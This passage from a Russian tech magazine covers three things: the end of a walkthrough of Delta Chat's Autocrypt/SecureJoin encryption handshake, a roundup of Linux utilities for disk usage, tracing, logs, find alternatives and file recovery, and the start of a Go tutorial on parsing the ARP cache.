<iHC5gr5yV@nine.testrun.org> . Это просто текст, сам по себе он ничего
не доказывает — любой может написать любой адрес. Чтобы привязать его
к ключу по‑настоящему, нужна подпись — она идет сразу следом.
   Третий пакет — самоподпись первичного Ed25519 над парой (Public-Key +
User ID). Тип подписи 0x13 — Positive Certification of User ID — означает: «Я,
владелец  ключа  74EE15BF,  подтверждаю,  что  адрес  iHC5gr5yV@nine.
testrun.org принадлежит мне».
   Внутри подписи лежат подпакеты с параметрами ключа: что он умеет
(KeyFlags = 0x03 — sign + certify), какие алгоритмы шифрования предпочитает
(AES-256), какие хеши (SHA-256), поддерживает ли MDC (защиту целостнос‐
ти).
   Четвертый пакет — отдельный подключ, на этот раз X25519 (он же
Curve25519). Его единственная задача — получать зашифрованные сооб‐
щения. Подписывать он ничего не может и не должен.
   Пятый пакет — еще одна подпись первичного Ed25519, но уже над подклю‐
чом  X25519.  Тип  0x18 —  Subkey  Binding  Signature —  означает:  «Я,
Ed25519 с отпечатком 74EE15BF, подтверждаю, что вон тот подключ X25519 —
мой. Используйте его для шифрования отправляемых мне писем».


Шаг 2: получение vc-auth-required
Delivered-To: ihc5gr5yv@nine.testrun.org
Content-Type: multipart/encrypted; protocol="application/pgp-
encrypted";
        boundary="18a502616f989460_3cd6bfce68d8edfa_6a93b0d7f94e0292"
MIME-Version: 1.0
From: <zgmor45qk@nine.testrun.org>
To: "hidden-recipients": ;
Subject: [...]
Date: Sun, 5 Apr 2026 20:02:09 +0000
Message-ID: <6713f97b-9428-492f-a97e-5c5097a81521@localhost>
Chat-Version: 1.0


-----BEGIN PGP MESSAGE-----


wU4DAAAAAAAAAAASAQdAsn+IIbHb3 (...)

В ответ приходит письмо с PGP MESSAGE. Расшифровываем его закрытым
ключом и получаем настоящее письмо:


From: <zgmor45qk@nine.testrun.org>
To: <ihc5gr5yv@nine.testrun.org>
Subject: Re: Hello from pydeltachat!
Date: Fri, 10 Apr 2026 13:37:25 +0000
In-Reply-To: <48bde109-c0ed-4e4c-93b0-4f86643dab8e@pydeltachat>
References: <48bde109-c0ed-4e4c-93b0-4f86643dab8e@pydeltachat>
Chat-Version: 1.0
Autocrypt: addr=zgmor45qk@nine.testrun.org; prefer-encrypt=mutual;
keydata=xjMEaddKsxYJKwYBBAHaRw8BAQdAAbOVxj+l (...)
Secure-Join: vc-auth-required
Message-ID: <6713f97b-9428-492f-a97e-5c5097a81521@localhost>
HP-Outer: From: <zgmor45qk@nine.testrun.org>
HP-Outer: To: "hidden-recipients": ;
HP-Outer: Subject: [...]
HP-Outer: Date: Sun, 5 Apr 2026 20:02:09 +0000
HP-Outer: Message-ID: <6713f97b-9428-492f-a97e-
5c5097a81521@localhost>
HP-Outer: Chat-Version: 1.0
Autocrypt-Gossip: addr=ihc5gr5yv@nine.testrun.org;
keydata=xjMEadjHhRYJKw (...)

В поле Autocrypt prefer-encrypt=mutual приходит аналогичная структура
с открытым ключом собеседника. Через Autocrypt-Gossip передаются клю‐
чи всех участников чата — для защиты от рассинхронизации и дополнитель‐
ного подтверждения правильности ключей.


Шаг 3: отправка vc-request-with-auth
Content-Type: multipart/encrypted; protocol="application/pgp-
encrypted"; boundary="b-fe53eca845e141e9"
MIME-Version: 1.0
Chat-Version: 1.0
From: <iHC5gr5yV@nine.testrun.org>
To: "hidden-recipients": ;
Date: Fri, 10 Apr 2026 17:37:28 +0400
Message-ID: <bf30e8ae-50b1-411d-a3af-31c9d9721d53@pydeltachat>
Subject: [...]
Autocrypt: addr=iHC5gr5yV@nine.testrun.org; prefer-encrypt=mutual;
        keydata=xjMEadjHhRYJKwYBBAHaR (...)


-----BEGIN PGP MESSAGE-----


wV4DO8isxk0h74QSAQdA3fzaJZ4kDwOHw (...)

Это своего рода хендшейк. Если декодировать Base64, получится последова‐
тельность пакетов OpenPGP:
 • Public-Key Encrypted Session Key — сеансовый ключ AES;
 • Symmetrically Encrypted Integrity Protected Data — зашифрованный контей‐
   нер:
    • One-Pass Signature — заголовок подписи;
    • Literal Data — контейнер для произвольных байтов;
    • Signature — подпись Ed25519 над содержимым Literal Data;
 • Modification Detection Code — SHA-1 всего потока до MDC.

Literal Data — это email-сообщение без тела, где вся полезная информация
в заголовках:
 • Secure-Join-Auth — «я знаю secret из твоей инвайт‑ссылки, ты меня приг‐
   лашал»;
 • Secure-Join-Fingerprint — «вот отпечаток моего ключа, сверь с тем, что
   в Autocrypt»;
 • Autocrypt: keydata — «вот мой публичный ключ целиком».


Шаг 4: отправка зашифрованного сообщения
Content-Type: multipart/encrypted; protocol="application/pgp-
encrypted"; boundary="b-4968370b4e6c44a3"
MIME-Version: 1.0
Chat-Version: 1.0
From: <iHC5gr5yV@nine.testrun.org>
To: "hidden-recipients": ;
Date: Fri, 10 Apr 2026 17:37:29 +0400
Message-ID: <569cad22-4c80-47d2-a0aa-6792c5a46276@pydeltachat>
Subject: [...]
Autocrypt: addr=iHC5gr5yV@nine.testrun.org; prefer-encrypt=mutual;
        keydata=xjMEadjHhRYJKwYBBA (...)


-----BEGIN PGP MESSAGE-----


wV4DO8isxk0h74QSAQdAke1lBT5ZDTfObXow/4B (...)

Внутри PGP MESSAGE почти то же, что и на прошлом шаге, но Literal Data
содержит само пользовательское сообщение.


Свойства Autocrypt
Из плюсов схемы:
 • opportunistic encryption — шифрование без ручной настройки ключей;
 • trust on  first use — первый полученный ключ для адреса принимается
   на веру и запоминается;
 • аутентичность сообщений — цифровая подпись Ed25519 внутри SEIPD.

Но есть и минусы:
 • нет forward secrecy — ключи долгоживущие. Украл приватный ключ — рас‐
   шифровал весь архив писем за всю  историю. В  отличие от  Signal
   и OMEMO с Double Ratchet;
 • нет post-compromise security — после компрометации ключа нет способа
   автоматически «вылечиться», кроме ручной генерации нового ключа;
 • нет deniability — подпись Ed25519 криптографически доказывает авторс‐
   тво. В отличие от OTR и Signal с правдоподобным отрицанием.

Также у Autocrypt есть уязвимость к MITM на первом контакте. Эту проблему
решает SecureJoin: ссылка или QR-код содержит fingerprint, переданный вне
email-канала.


Эхо-бот
В коде эхо‑бота нет ничего принципиально нового, так что эта задача оста‐
ется тебе в качестве практики.


ПРИЛОЖЕНИЯ

В Delta Chat встроенные App — обычные HTML5-приложения (HTML + CSS +
JS), запакованные в файл .xdc (по сути — ZIP-архив). Приложение отправ‐
ляется в чат как вложение, любой участник нажимает Start — и оно запускает‐
ся прямо внутри мессенджера в изолированном браузере. Так работают
списки покупок, календари, опросы, совместное редактирование документов
и даже игры вроде Quake 3.
   Webxdc-приложения   обмениваются   данными  через  два   канала.
Основной — через email. Это надежно, но не мгновенно: задержка зависит
от скорости почтового сервера. Второй канал — realtime peer-to-peer через
библиотеку Iroh .
   Delta Chat устанавливает прямое P2P-соединение между участниками
по QUIC с hole punching, а если прямое соединение не удается — трафик
идет через relay-серверы  Iroh. Соединение использует эфемерные крип‐
тографические идентификаторы (forward secrecy: при перезапуске создается
новая пара ключей). Именно через realtime-канал работают аудио- и виде‐
озвонки.


БЕЗОПАСНОСТЬ

Безопасность Delta Chat проверена несколькими независимыми аудитами.
Самый серьезный — криптоанализ от группы ETH Zürich . Исследователи наш‐
ли пять атак на взаимодействие между SecureJoin и Autocrypt, а также баги
в rPGP — все исправили в версии 1.44. Концептуальных уязвимостей в самом
протоколе не обнаружили, но подтвердили важное условие: invite-ссылки нуж‐
но передавать по приватному каналу, иначе возможна атака «человек посере‐
дине». Помимо  этого, rPGP  проходил  отдельные  аудиты  безопасности
в 2019 и 2023 годах.
   Главная угроза на горизонте — квантовые компьютеры и атака «harvest
now, decrypt later»: злоумышленник перехватывает зашифрованный трафик
сегодня, чтобы расшифровать его через годы, когда появятся мощные кван‐
товые машины. В Delta Chat планируют решить это через Autocrypt 2 с пост‐
квантовой криптографией (PQC) поверх OpenPGP v6. Внедрение запланиро‐
вано на 2026 год.
   Есть и проблема by design: если злоумышленник украдет приватный ключ,
он сможет незаметно читать как старые, так и новые сообщения. Единствен‐
ный выход при компрометации — создать новый аккаунт с новыми ключами.
К счастью, подобной проблемы нет в OMEMO : механизм «трещоток» и под‐
мешивание эфемерных ключей защищает переписку даже в этом случае.


ЗАКЛЮЧЕНИЕ

Delta Chat — неплохая замена Telegram для повседневного общения, и глав‐
ный плюс — это встроенное E2E-шифрование. Регистрация через релеи
не требует подтверждения по СМС. Тем не менее анонимным мессенджер
я бы не назвал. Метаданные о том, кто с кем общается, остаются в сети, P2P
по определению светит IP-адресом, а текущая реализация допускает рас‐
шифровку собранных сообщений в будущем. © X
ТРЮКИ





Давненько я не писал подборок  утилит!
В этом выпуске «мастерской» —  инстру‐
менты для  разгребания  файлохранилищ,
отладки    неразговорчивых    программ               Polski Kot
                                                                                Фальшыўка, сфабрыкованая
и работы с логами. Готовь терминал и при‐                ў Польшчы
саживайся поудобнее!


Предыдущие подборки утилит командной строки

 • Магия консоли. Подбираем полезные утилиты для работы в терминале
 • Магия консоли 2. Запасаемся инструментами на все случаи жизни
 • Мастерская хакера. Подборка полезных инструментов для Windows и Linux
 • Мастерская хакера. 13 утилит для Linux, которые пригодятся админу
 • Мастерская хакера. Собираем утилиты, которые облегчат жизнь и работу
 • Мастерская хакера. ИИ‑помощники, работа с JSON и приятные мелочи,
   которые пригодятся в работе
 • Мастерская хакера. Стресс‑тестинг сайтов, бенчмарк для команд, работа
   с текстом и другие полезности




GDU

Gdu (Go DiskUsage) — это мощный инструмент для разгребания завалов
в файловой системе. Он быстро сканирует заданную директорию рекурсивно
и строит удобный интерактивный TUI-интерфейс, где можно перемещаться
по дереву папок и удалять ненужные.


WinDirStat
Ближайший аналог gdu для Windows — программа WinDirStat .





Устанавливается gdu простым скачиванием бинарника с GitHub:


curl -L https://github.com/dundee/gdu/releases/latest/download/gdu_
linux_amd64.tgz | tar xz
chmod +x gdu_linux_amd64
sudo mv gdu_linux_amd64 /usr/bin/gdu

Запуск gdu без аргументов заставит программу анализировать текущую
директорию.





  Сканирование может занять какое‑то время. И оно не будет выглядеть
  как зависание

На  сканирование ~200 Гбайт  данных  требуется  чуть  меньше  четырех
секунд — скорость на уровне!
   После сканирования открывается интерактивное дерево файловой сис‐
темы, где можно посмотреть, сколько суммарно что занимает.





                               Дерево ФС

Альтернатива — прямой запуск через Docker:


docker run --rm --init --interactive --tty --privileged --volume /:/
mnt/root ghcr.io/dundee/gdu /mnt/root

Встроенная справка весьма информативна и в особых комментариях не нуж‐
дается, но я все же отмечу несколько важных хоткеев:
 • r пересканирует текущую папку;
 • b открывает терминал в текущей папке  ( exit потом вернет обратно
   в gdu);
 • d удаляет выбранный элемент, а пробелом можно выбрать несколько, что‐
  бы удалить списком.

Gdu поддерживает неинтерактивный режим и умеет выводить результаты
в JSON на случай использования в каком‑то внешнем пайплайне (например,
выводить самые крупные файлы в уведомлении о переполнении диска). Вот,
например, сохранение отчета в сжатый JSON из документации проекта:


gdu -o- / | gzip -c >report.json.gz

Для прочтения отчета:


zcat report.json.gz | gdu -f-


SNAPDIFF

Для сравнения текстовых файлов удобно использовать diff. Но что, если нуж‐
но сравнить содержимое не двух файлов, а двух бэкапов на десятки тысяч
файлов каждый? Оказывается, утилита есть и для этого, и называется она
snapdiff .
   Основной сценарий использования — сравнивать регулярные снапшоты
файловой системы. По умолчанию программа выводит только общую статис‐
тику (сколько всего данных, сколько общих, сколько добавлено, удалено
или изменено), но есть ключ --report , который покажет все неидентичные
файлы.
   Snapdiff написан на Rust, и для установки понадобится компилятор версии
минимум 1.70.0. Установить его можно с помощью однострочника:


curl --proto '=https' --tlsv1 .2 -sSf https://sh.rustup.rs | sh

Дальше склонируй репозиторий с кодом и собери бинарник:


git clone https://github.com/jotaen/snapdiff.git
cargo build --release
# Бинарник окажется в target/release/snapdiff

Теперь можно  запускать!  Чтобы  сравнить /mnt/backup/snap1 и /mnt/
backup/snap2 ,  используй snapdiff  /mnt/backup/snap1  /mnt/backup/
snap2 .





                                    Snapdiff

Ключ --report report.txt позволяет получить подробный список неиден‐
тичных файлов. Используй его, если делаешь  автоматический пайплайн
для инкрементальных бэкапов или чего‑то такого.


PROGRESS

Когда копируешь большие файлы (например, бэкапы), может показаться, что
процесс копирования завис, а 10% прогресса визуально никак не отличаются
от 95%. Исправлять это досадно раздражающее недоразумение изменением
самих утилит копирования/перемещения было бы неправильно: все же слиш‐
ком много сторонних скриптов на них завязано и внезапная смена поведения
точно не пойдет им на пользу.
   Компромиссное решение было найдено уже больше десяти лет назад
в утилите cv , теперь более известной под названием progress . Она умеет
показывать прогресс выполнения для большого количества команд из пакета
coreutils, в который входят не только cp и mv , но и tar, gzip , cat, dd и прочие.
Изменять флаги при вызове этих команд не нужно — progress умеет показы‐
вать статус в стандартной конфигурации.
   Делается это путем сканирования /proc , поиска открытых файлов в fd
и fdinfo и определения позиции в самых крупных файлах. То есть в целом
подход совместим почти с любыми программами, а не только coreutils (прос‐
то они уже внесены в список наблюдения по умолчанию).
   Установить чудо‑утилиту можно просто из репозиториев:


apt install progress

Когда в системе работает любая длительная команда, можно выполнить
progress , чтобы увидеть статус.




                          Это прогресс!

Конечно же, утилита поддерживает дополнительные флаги и готовые кра‐
сивые сценарии использования. К примеру, следующая команда, запущенная
в отдельном окне, в реальном времени покажет прогресс выполнения всех
текущих и будущих команд:


progress -M

Флаг -c позволяет фильтровать вывод только по указанным командам, то
есть progress  -c  chromium покажет только процесс скачивания файла
в Chromium, но не копирование чего‑то еще в фоне. Параметр -p позволяет
указать PID программы, за которой нужно наблюдать, если нужно смотреть
за каким‑то конкретным экземпляром программы, а не за всеми с одним име‐
нем.
  Флаг -w несколько замедляет вывод, но взамен показывает скорость
работы в абсолютных числах, то есть можно узнать, как быстро скачивается
или копируется файл. Замедление происходит из‑за того, что progress
в таком случае делает несколько измерений с небольшой паузой и на осно‐
вании  этого  рассчитывает  скорость.  Длительность паузы можно задать
параметром -W , например -W 0.5 задаст задержку в полсекунды.
  Еще есть вот такой простой сниппет, который позволяет запустить про‐
цесс сразу с мониторингом прогресса:


cp srcfile destfile & progress -mp $!

Конструкция $! разворачивается в PID только что запущенного процесса,
а флаг -m заставляет progress продолжать обновлять статус до завершения
работы процесса, а не просто показать текущий прогресс и выйти. Записы‐
вай в алиасы!


PSFILES

Когда нужно найти, где какая‑нибудь плохо документированная программа
хранит конфиг, или, например, отдебажить проблему отсутствия неизвестно‐
го файла, проще всего воспользоваться встроенным инструментом strace,
который  просто выведет все системные вызовы  указанной программы.
Но вывод strace весьма многословен, поскольку, кроме собственно работы
с файлами, любая программа выполняет еще кучу других задач. Оптимизи‐
ровать этот процесс поможет psfiles — специальный инструмент для отладки
обращений к файловой системе.





                                     Psfiles в деле

По сути, psfiles просто ловит все системные вызовы и отображает те, что свя‐
заны с файловой системой, а именно (p)read(v) , (p)write(v) , open(at),
close , rename(at) и unlink(at). От связки strace + grep это решение отли‐
чается тем, что обновляет в реальном времени обращения к файлам, филь‐
труя дубликаты, и считает количество прочитанных и записанных байтов.


             INFO

                           Счетчик байтов не работает для файлов, отоб‐
                        раженных на память (memory-mapped)! Связано
                        это с тем, что при работе с такими файлами
                       не  используются  системные вызовы, а  обра‐
                    щение к ним происходит как к обычному куску
                           оперативной памяти.


Для установки придется компилировать утилиту самостоятельно. Для этого
выполни следующие команды:


git clone https://github.com/mukovnin/psfiles
cd psfiles
cmake . -B build
cd build
make
make install

При запуске есть полтора важных аргумента: обязательный -p , который ука‐
зывает, к какому процессу нужно подцепиться, и опциональный -f , который
позволяет отфильтровать файлы по путям.


psfiles -f "/home/xakep/*" -p $(pidof gedit)

Вместо указания PID процесса‑жертвы можно просто запустить его прямо
из программы — для этого передай командную строку запуска аргументом -
c :


psfiles -c nano $(mktemp)


COMPENDIUM

Если у тебя лапки, но хочется трассировщик как у взрослых, только с блестка‐
ми, — решение есть и для тебя. Проект compendium — это strace с нормаль‐
ным выводом в консоль и отчетами в HTML, чтобы разобрался даже начина‐
ющий админ.
  Compendium показывает (почти) все подряд системные вызовы процесса,
на случай если тебе понадобится отлаживать не только обращения к фай‐
ловой системе, но и какие‑то другие аспекты работы программы. Делается
это, в отличие от обычного strace, в весьма культурном и чистом виде. Срав‐
ни!





                           Обычный strace




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИТРЮКИ
  МАСТЕРСКАЯ ХАКEРА
             ЛЕЗЕМ В НЕДРА СИСТЕМЫ
             И РАБОТАЕМ С ФАЙЛАМИ





                         Compendium

Устанавливается инструмент через cargo, так как написан на новомодном
Rust.


cargo install compendium

Установка не очень стабильная и периодически вываливает ошибки без внят‐
ных инструкций по починке. Но если справишься, то получишь прекрасный
инструмент.
   После установки достаточно выбрать процесс, к которому подцепиться,
или запустить новый сразу с отладкой. Выбрать целевой PID можно аргумен‐
том --pid :


compendium --pid 1337

Если запускать новый процесс с отладкой — укажи команду для запуска после
-- :


compendium -- cp /etc/hosts /tmp/hosts-copy

Compendium  поддерживает  опциональный модуль  eBPF,  что  позволяет
логировать события ввода‑вывода при работе с блочными устройствами.
Включается этот режим аргументом --ebpf, а для корректной работы бинар‐
нику compendium нужна привилегия CAP_BPF (или  root-доступ). С eBPF
отладка неизвестного бинарника превращается в почти классический дебаг
через print , где видно каждую связь исследуемого с внешним миром. Еще и
красивые отчетики рисует!
   Кстати, о HTML-отчетах: для генерации отчета нужно передать аргумент --
report output.html , а все остальное compendium сделает сам. Отчет инте‐
рактивный — можно крутить графики и вообще исследовать его, как хочется.





                               Отчет compendium

В общем, штука чрезвычайно простая и мощная и точно пригодится начина‐
ющему админу. Да и продолжающему тоже!


TOOLONG

Тебе тоже надоело возиться с тоннами логов? В целом grep + less + tail —
неплохая связка, которой хватает в большинстве случаев. Но если с логами
работать часто, становится необходим полноценный инструмент. Я для себя
открыл toolong — TUI-программу для просмотра особо больших логов с воз‐
можностью интерактивного поиска и удобного просмотра найденных строк.





                          Интерфейс Toolong

Установить можно через pip или, что даже лучше, через pipx . Просто выпол‐
ни


pipx install toolong

Теперь смотрим логи:


tl /var/log/nginx/access.log

Когда открыт один файл, он постоянно мониторится на предмет новых строк.
Удобно, чтобы смотреть лог в реальном времени, — почти как tail -f , но с
нормальным поиском!
   Открыть можно и несколько файлов — тогда они отобразятся в разных
вкладках. Но это нужно редко, поэтому при открытии нескольких файлов
используй ключ --merge , чтобы обрабатывать все куски как один большой
лог, собранный в хронологическом порядке.
   Файлы логов могут быть сжаты — это не повлияет на работу утилиты. Нап‐
ример, можно прочитать всю историю логов Nginx, чтобы отслеживать даже
старые обращения к интересующим эндпоинтам:


tl /var/log/nginx/access.* --merge





                         Многофайловый режим

При просмотре сразу нескольких файлов на одном экране в правом нижнем
углу отображается, в каком конкретно файле нашлось совпадение. Как видно,
gzip-сжатие файла с логом нисколько не помешало его открыть и корректно
распарсить.
  В целом toolong выглядит как гибрид nano и less. Если ты пользуешься
обоими, но хочешь взять от них лучшее и использовать одновременно, то
toolong — твой выбор.


BFS

Использование команды find напоминает поедание кактуса: первое время
больно, потом снова больно, потом все горит, но в конце можно добраться
до вкусной сердцевины — если хватит терпения.
   Одна из неприятных иголок find — это поиск в глубину. Обычно поль‐
зователь предполагает, что поиск сперва проверит всё на поверхности,
а потом будет копать глубже, а не сразу завязнет в бесконечной трясине фай‐
лов (особенно плохо дело, когда у тебя на машине стоят Docker и Snap).
Именно для поиска в ширину придуман клон find под названием bfs .
  Для установки bfs не нужно ничего собирать самостоятельно — утилита
уже есть в репозиториях всех популярных дистрибутивов. Для Debian/Ubuntu
все совсем просто:


apt install bfs

После этого можешь просто find заменить bfs — остальные опции полностью
совместимы. В большинстве задач ты найдешь нужные файлы куда быстрее,
чем со стандартным find.


RECOVERPY

Допустим, ты нечаянно удалил какой‑то важный файл, а резервных копий
у тебя почему‑то нет. Беда!
   Есть даже народная мудрость:


      Данные бывают или ценные, или уникальные. Если они ценные, то
       у тебя есть как минимум две запасные копии. Если они уникальные (то«
      есть резервных копий у тебя нет), значит, тебе не жалко их потерять
      или их можно легко восстановить, просто скачав файлы из интернета.
     А те, кто умудрился потерять ценные данные, взамен приобрели цен‐
     ный опыт.                »
Но даже в такой безвыходной ситуации данные еще можно попробовать
спасти. Причем сделать это иногда реально, даже если они были частично
перезаписаны.
  При таком раскладе пытаться интерпретировать то, что осталось от струк‐
туры файловой системы, довольно бесполезно, потому что, если ты вообще
вынужден был обратиться к тяжелой артиллерии, очевидно, что простые инс‐
трументы вроде Recuva, которые как раз ищут на диске остатки файловых
записей, уже не помогают.
   Остается только вытаскивать обрывки файла, которые еще могли уцелеть.
Инструмент RecoverPy делает именно это — сканирует диск в поисках некой
ключевой последовательности, которую ты помнишь из утраченного файла,
и позволяет вытянуть данные в сыром виде.
   Установить его можно через pip:


pip install recoverpy

Либо через uv:


uv tool install recoverpy

Запуск любого софта для низкоуровневого доступа к дискам обычно требует
прав root (если ты не чудил с привилегиями в системе), то есть запускать нуж‐
но будет или от root, или через sudo.
   Утилита имеет очень простой и понятный консольный интерфейс, под‐
держивается работа мышью. Запускай RecoverPy от рута без аргументов,
выбирай желаемый раздел и вводи строку для поиска.





После окончания сканирования просто выбираешь найденный результат,
смотришь, листаешь блоки рядом и сохраняешь ценное.





                         Список найденных файлов





                        Просмотр сырого блока

Да, для восстановления фоток или архивов такой метод почти не годится,
но сид‑фразу от криптокошелька или SSH-ключ можно найти без особых
трудностей. А большего и не надо.
   Если я упустил что‑то важное — не стесняйся писать об этом в коммента‐
риях! Присылай утилиты, которые спасают твою жизнь, и я постараюсь рас‐
сказать о них читателям в следующих выпусках. А я пойду дальше разбирать
то, что вы уже прислали, — там хватит еще не на одну подборку! © X
КОДИНГ





Работа с  текстовыми файлами — одна
из самых распространенных задач в прог‐
раммировании. В  этой  статье мы  раз‐
беремся с парсингом текста на Go, а для                                                                                                                   flexits
                                                                               Инженер и разработчикпримера возьмем кеш ARP. Будем исполь‐                                                                                  (embedded + backend)
зовать эти данные, чтобы установить соот‐         4d.41.49.4c@gmail.com
ветствие  между  адресами MAC  и  IP
в локальной сети.


В простейшем случае файл содержит одно значение (токен) на строку — так
обычно построены вордлисты для брута или фаззинга. В других случаях файл
имеет заданную регулярную структуру, например всевозможные вариации
CSV, хорошо подходящие для табличных данных, телеметрии и подобных
наборов.
   Хуже всего, когда входной файл изначально предназначен для чтения
человеком и содержит дополнительное форматирование — отступы, вырав‐
нивание  пробелами,  подзаголовки,  псевдографику.  Такие  файлы мы
не можем просто читать «как есть» — приходится находить и использовать
только отдельные фрагменты.
  В этой статье мы рассмотрим основные приемы получения интересующей
нас информации из текстового файла, то есть его парсинг .
   Практический пример возьмем несколько отвлеченный, но зато имеющий‐
ся на любом компьютере — кеш ARP. Будем использовать данные из этого
кеша, чтобы установить соответствие между IP- и MAC-адресами устройств
в локальной сети.
   Поскольку в разных ОС доступ к содержимому кеша получают немного
по‑разному, одновременно разберем и работу с платформенно зависимым
кодом: в Linux можно прочитать содержимое /proc/net/arp, а в Windows —
выполнить arp  -a . Наконец, преобразуем написанный нами код парсера
в пакет, пригодный для использования в других проектах.


             INFO

                   Кеш ARP  наполняется операционной системой
                             автоматически (обычно при попытке  установки
                         соединения с узлом  локальной  сети).  Доступ
                          к этим сведениям не требует повышения  пол‐
                       номочий, в отличие от открытия сокета и отправ‐
                        ки ARP discovery пакета вручную (а чтобы сделать
                        такое на Windows-хосте, обычно требуется еще и
                           установить предварительно Npcap/WinPcap).


Начнем, как всегда, с создания нового пакета:


mkdir readarp && cd $_
go mod init readarp
touch main.go
touch arp.go

Поскольку часть кода будет зависеть от целевой платформы, сразу создадим
два файла. В main.go будет наша точка входа, а в arp.go — код для работы
с кешем ARP.
  В будущем мы собираемся получать MAC-адрес, соответствующий задан‐
ному IP. В таком сценарии нецелесообразно читать все содержимое кеша
при каждом запросе. Гораздо эффективнее сделать это один раз и сразу сох‐
ранить интересующие нас сведения для последующих обращений.
  Для хранения обработанных данных мы могли бы создать структуру с дву‐
мя полями — IP и MAC — и сохранить набор ее экземпляров в слайсе,
в котором потом будем искать нужное. Но лучше применить другой подход
и хранить данные в виде коллекции пар ключ — значение, где IP-адреса будут
уникальными ключами, для чего мы используем структуру данных map.
    Хотя пока мы ничего такого не делаем, решение о выборе структуры дан‐
ных принимаем уже сейчас, чтобы потом не переписывать много кода.
   Содержимое файла arp.go :


package main


func retrieveArpTable() map[string]string {
    result := make(map[string]string)
    // TODO not implemented
    return result
}

Здесь мы объявляем функцию, которая обрабатывает данные из кеша и воз‐
вращает словарь с нужными нам значениями.
  И содержимое файла main.go :


package main


import "fmt"


func main() {
    arpResuls := retrieveArpTable()
    fmt.Print(arpResuls)
}

Здесь мы просто выводим на экран данные из словаря, сформированного
функцией retrieveArpTable() . Пока это не совсем то, что мы хотим сделать
в итоге: это просто функция‑заглушка, дающая нам возможность увидеть про‐
межуточные результаты выполнения. Чуть позже мы от нее вообще избавим‐
ся.
   Обрати внимание: хоть файлы и разные, они относятся к одному пакету —
в данном случае main , — и мы в файле main.go без каких‑либо дополнитель‐
ных действий вызываем функцию, определенную в arp.go .


Отличие структуры от структуры
Возможно, к этому моменту у тебя в голове возникла некоторая путаница.
Раньше мы говорили о структуре как о типе данных, который объявляем
с ключевым словом struct и далее работаем с его полями. Но также мы
используем такое выражение, как «структура данных», говоря о map или slice.
   Действительно, и map, и slice — внутри структура с соответствующими
полями и методами. Но дело здесь в другом. В computer science «структура
данных» — это фундаментальное понятие, описывающее конкретный способ
размещения и организации коллекции данных в памяти.
   Структуры данных — это такие вещи, как списки, стеки, очереди, деревья,
хеш‑таблицы и прочее. А реализованы они могут быть с помощью структур
(которые struct), или классов, или еще как‑нибудь. В свою очередь, тип ( type
MySet struct), являющийся реализацией той или иной структуры данных, мы
в обиходе обычно тоже называем просто структурой данных, то есть здесь
имеет место некоторое размывание границ между понятиями.



СЛОВАРИ, ИЛИ КАРТЫ (MAP)

Функция retrieveArpTable() возвращает словарь (ключевое слово map)
с ключами типа string (тип ключа указывается в квадратных скобках) и зна‐
чениями типа string (тип значения указывается после квадратных скобок).


             INFO

                   Map — это коллекция пар ключ — значение, где
                          ключи уникальны и применяются для извлечения
                           значений, подобно тому как в массивах или сре‐
                         зах используется индекс. В разной литературе
                      по разным языкам программирования встречают‐
                        ся разные названия этой структуры: «ассоциатив‐
                     ный  массив»,  «словарь»,  «хеш‑таблица»,  дос‐
                      ловный перевод «карта» и даже калька с англий‐
                             ского «мапа». В источниках по Go обычно исполь‐
                       зуют последние два варианта, тем не менее я
                          предпочту  «словарь». Словарь хорош тем, что
                           обеспечивает доступ к значению по ключу за кон‐
                        стантное время O(1), независимо от размера кол‐
                       лекции — в отличие от поиска в массиве или сре‐
                           зе.


Как и срезы, словари создаются командой make . Вторым аргументом можно
указать емкость коллекции, если она известна заранее. При превышении
емкости она будет автоматически увеличена — здесь все так же, как и в слу‐
чае со срезами.
   Доступ к элементу коллекции происходит по ключу, который передается
в квадратных скобках, так же как индекс массива или среза: value  :=
result[key] . Если ключ не найден, вернется значение по умолчанию для это‐
го типа (zero value).
   Возможно, у тебя здесь сразу возник вопрос: а что, если zero value —
легитимное значение для элемента нашей коллекции? Как отличить две ситу‐
ации: в коллекции есть искомый ключ, и с ним связано значение 0 (или пустая
строка), или в коллекции нет этого ключа, и мы получили 0 (или пустую строку)
как значение по умолчанию для типа int (или string)?
  На самом деле здесь  возвращаются два  значения: value,  ok  :=
result[key] , и как раз второе указывает, был ли найден ключ. Если нам нуж‐
но только проверить существование ключа, первое значение можно вообще
отбросить: _, ok := result[key] .
   Запись значения происходит похожим образом: result[key] = value .
При этом значение будет добавлено в коллекцию, если такого ключа в ней
еще нет, или заменено, если такой ключ уже существует.
  Для  удаления  ключа  используется  функция  delete() . В  отличие
от append() , с которой мы познакомились ранее, delete() изменяет сущес‐
твующую коллекцию, а не возвращает новую. Если удаляемый ключ и так
отсутствует в коллекции, delete() завершается без ошибок.


             INFO

                       Примеры работы с map



Реализация множеств
В некоторых языках программирования ты мог видеть еще такую коллекцию
данных, как set (множество). Множество похоже на map в том плане, что
это тоже набор уникальных ключей и обеспечивает константную сложность
доступа O(1). Отличие состоит в том, что множество содержит только ключи,
без значений.
   Если тебе понадобится такая структура данных в Go, то идиоматичной
реализацией является map с ключами требуемого типа и значениями типа
«пустая структура» — struct{} . Почему именно пустая структура? Все прос‐
то: в Go ее размер составляет ровно ноль байт.


 // Создаем set строк
 mySet := make(map[string]struct{})
 // Добавляем элемент
 mySet["newElement"] = struct{}{}
 // Удаляем элемент
 delete(mySet, "spareElement")
 // Проверяем наличие элемента
 _, ok := mySet["checkElement"]
 if ok {
     // Найден!
 }





ПАКЕТ STRINGS

Теперь перейдем к парсингу текстовых данных. В этом нам поможет пакет
strings из стандартной библиотеки Go (смотри, сколько всего мы уже сделали,
и до сих пор обходимся средствами стандартной библиотеки!). Как ты уже
догадался по названию, этот пакет объединяет средства работы со строками.
   Помимо прочего, мы можем проверить вхождение подстроки ( Contains(
) ), проверить, начинается или заканчивается ли строка заданной подстрокой
( HasPrefix() и HasSuffix() ), разрезать строку на части ( Cut() , Split()
и Fields() ), привести к верхнему и нижнему регистру ( ToUpper() и ToLower(
) ) и сделать много чего еще — как всегда, я советую заглянуть в докумен‐
тацию .
   Версия для Linux:


func retrieveArpTable() map[string]string {
    result := make(map[string]string)


    // Здесь платформенно зависимый код (Linux)
    f, err := os.Open("/proc/net/arp")
    if err != nil {
        return result
    }
    defer f.Close()


    scanner := bufio.NewScanner(f)
    for scanner.Scan() {
        l := scanner.Text()
        l = strings.TrimSpace(l)
        if l == "" {
            continue
        }


        tokens := strings.Fields(l)
        if len(tokens) < 4 {
            continue
        }


        ipStr := tokens[0]
        macStr := tokens[3]


        ip := net.ParseIP(ipStr)
        if ip == nil {
            continue
        }
